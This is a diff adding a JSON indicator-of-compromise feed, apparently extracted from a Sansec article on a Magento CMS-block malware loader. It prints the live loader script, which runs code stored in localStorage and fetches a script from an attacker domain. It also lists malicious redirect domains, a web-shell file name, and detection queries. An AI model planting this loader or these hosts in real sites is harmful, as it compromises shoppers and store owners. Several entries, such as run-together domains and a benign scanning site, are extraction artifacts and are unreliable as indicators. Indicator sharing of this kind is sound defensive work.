@@ -1,0 +1,190 @@
+[
+    {
+        "url": "https://sansec.io/research/magento-cms-block-loader-deepveindrilling",
+        "date": "2026-10-25",
+        "title": "",
+        "feedText": "",
+        "indicators": [
+            {
+                "kind": "code",
+                "text": "deepveindrilling.com",
+                "context": "deepveindrilling.com"
+            },
+            {
+                "kind": "code",
+                "text": "<script>!function(){try{var c=localStorage.getItem(\"fpCode\");if(c){var e=document.createElement(\"div\");e.setAttribute(\"onclick\",c);document.documentElement.appendChild(e);e.click();e.remove()}}catch(e){}}();</script>\n<script src=\"https://deepveindrilling.com/?s=d35c5031\"></script>",
+                "context": "<script>!function(){try{var c=localStorage.getItem(\"fpCode\");if(c){var e=document.createElement(\"div\");e.setAttribute(\"onclick\",c);document.documentElement.appe"
+            },
+            {
+                "kind": "code",
+                "text": "https://deepveindrilling.com/?s=49b7ca5f&fp=",
+                "context": "https://deepveindrilling.com/?s=49b7ca5f&fp="
+            },
+            {
+                "kind": "code",
+                "text": "https://crypto-insider.top/ssl/",
+                "context": "https://crypto-insider.top/ssl/"
+            },
+            {
+                "kind": "code",
+                "text": "https://leqdger.click/ssl/",
+                "context": "https://leqdger.click/ssl/"
+            },
+            {
+                "kind": "code",
+                "text": "https://additionalver.com/Mb2z8J?&se_referrer=",
+                "context": "https://additionalver.com/Mb2z8J?&se_referrer="
+            },
+            {
+                "kind": "code",
+                "text": "pub/media/custom_options/quote/",
+                "context": "pub/media/custom_options/quote/"
+            },
+            {
+                "kind": "code",
+                "text": "SELECT block_id, identifier, update_time FROM cms_block\nWHERE content LIKE '%fpCode%' OR content LIKE '%se_referrer%'\n   OR content LIKE '%localStorage.getItem%';",
+                "context": "SELECT block_id, identifier, update_time FROM cms_block WHERE content LIKE '%fpCode%' OR content LIKE '%se_referrer%' OR content LIKE '%localStorage.getItem%';"
+            },
+            {
+                "kind": "code",
+                "text": "find pub/media/custom_options/ pub/media/customer_address/ -type f ! -name '.htaccess'\nfind . -name 'accesson.php' -type f",
+                "context": "find pub/media/custom_options/ pub/media/customer_address/ -type f ! -name '.htaccess' find . -name 'accesson.php' -type f"
+            },
+            {
+                "kind": "code",
+                "text": "https://deepveindrilling.com/?s=d35c5031",
+                "context": "https://deepveindrilling.com/?s=d35c5031"
+            },
+            {
+                "kind": "code",
+                "text": "https://additionalver.com/Mb2z8J",
+                "context": "https://additionalver.com/Mb2z8J"
+            },
+            {
+                "kind": "code",
+                "text": "https://lanhd6549tdhse.top/KZtBscgb",
+                "context": "https://lanhd6549tdhse.top/KZtBscgb"
+            },
+            {
+                "kind": "code",
+                "text": "https://neswnsssn.click/PKgJDPfF",
+                "context": "https://neswnsssn.click/PKgJDPfF"
+            },
+            {
+                "kind": "code",
+                "text": "https://manulfie.click/GKTD8cBz",
+                "context": "https://manulfie.click/GKTD8cBz"
+            },
+            {
+                "kind": "code",
+                "text": "https://hdfdsi84j3h.top/sFnnPFHm",
+                "context": "https://hdfdsi84j3h.top/sFnnPFHm"
+            },
+            {
+                "kind": "code",
+                "text": "https://c85grt98sd.com/1kYrdH",
+                "context": "https://c85grt98sd.com/1kYrdH"
+            },
+            {
+                "kind": "code",
+                "text": "aHR0cHM6Ly9hZGRpdGlvbmFsdmVyLmNvbS9NYjJ6OEo/JnNlX3JlZmVycmVyPQ==",
+                "context": "aHR0cHM6Ly9hZGRpdGlvbmFsdmVyLmNvbS9NYjJ6OEo/JnNlX3JlZmVycmVyPQ=="
+            },
+            {
+                "kind": "base64",
+                "text": "stringaHR0cHM6Ly9hZGRpdGlvbmFsdmVyLmNvbS9NYjJ6OEo/JnNlX3JlZmVycmVyPQ==",
+                "context": "stringaHR0cHM6Ly9hZGRpdGlvbmFsdmVyLmNvbS9NYjJ6OEo/JnNlX3JlZmVycmVyPQ=="
+            },
+            {
+                "kind": "domain",
+                "text": "deepveindrilling.com",
+                "context": "deepveindrilling.com"
+            },
+            {
+                "kind": "domain",
+                "text": "2026deepveindrilling.com",
+                "context": "2026deepveindrilling.com"
+            },
+            {
+                "kind": "domain",
+                "text": "e.click",
+                "context": "e.click"
+            },
+            {
+                "kind": "domain",
+                "text": "urlscan.io",
+                "context": "urlscan.io"
+            },
+            {
+                "kind": "domain",
+                "text": "manulfie.click",
+                "context": "manulfie.click"
+            },
+            {
+                "kind": "domain",
+                "text": "crypto-insider.top",
+                "context": "crypto-insider.top"
+            },
+            {
+                "kind": "domain",
+                "text": "leqdger.click",
+                "context": "leqdger.click"
+            },
+            {
+                "kind": "domain",
+                "text": "neswnsssn.click",
+                "context": "neswnsssn.click"
+            },
+            {
+                "kind": "domain",
+                "text": "additionalver.com",
+                "context": "additionalver.com"
+            },
+            {
+                "kind": "domain",
+                "text": "hdfdsi84j3h.top",
+                "context": "hdfdsi84j3h.top"
+            },
+            {
+                "kind": "domain",
+                "text": "lanhd6549tdhse.top",
+                "context": "lanhd6549tdhse.top"
+            },
+            {
+                "kind": "domain",
+                "text": "c85grt98sd.com.neswnsssn.click",
+                "context": "c85grt98sd.com.neswnsssn.click"
+            },
+            {
+                "kind": "domain",
+                "text": "abovedomains.com",
+                "context": "abovedomains.com"
+            },
+            {
+                "kind": "domain",
+                "text": "c85grt98sd.com",
+                "context": "c85grt98sd.com"
+            },
+            {
+                "kind": "domain",
+                "text": "additionalver.com2026-10-06deepveindrilling.com",
+                "context": "additionalver.com2026-10-06deepveindrilling.com"
+            },
+            {
+                "kind": "file",
+                "text": "accesson.php",
+                "context": "accesson.php"
+            },
+            {
+                "kind": "call",
+                "text": "eval(",
+                "context": " it. The browser runs the code as an event handler, without eval(). Nothing in the block writes fpCode, so the script from deepveindrilling.com has to set it. A"
+            },
+            {
+                "kind": "call",
+                "text": "system (",
+                "context": "ommercial ad tracker that doubles as a traffic distribution system (TDS). It sends the referrer, page title and query string to a base64 encoded URL such as htt"
+            }
+        ]
+    }
+]
